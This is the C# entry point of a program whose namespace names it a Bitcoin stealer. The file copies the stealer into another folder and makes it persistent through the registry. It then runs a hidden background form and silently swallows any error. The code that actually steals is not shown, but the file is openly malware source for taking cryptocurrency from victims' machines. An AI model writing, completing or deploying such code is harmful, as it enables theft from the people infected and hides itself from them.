using System;
using System.Windows.Forms;


namespace BitcoinStealer
{
    static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            
            try
            {
                stealer.InstallImplant(); // move the stealer to a different folder
                stealer.PersistImplant(); // simple registry based 

                // ReSharper disable once ObjectCreationAsStatement
                // The Form has to run in the background
                new FormBackground();
                Application.Run();
            }
            
            catch
            {
                
            }
        }
    }
}
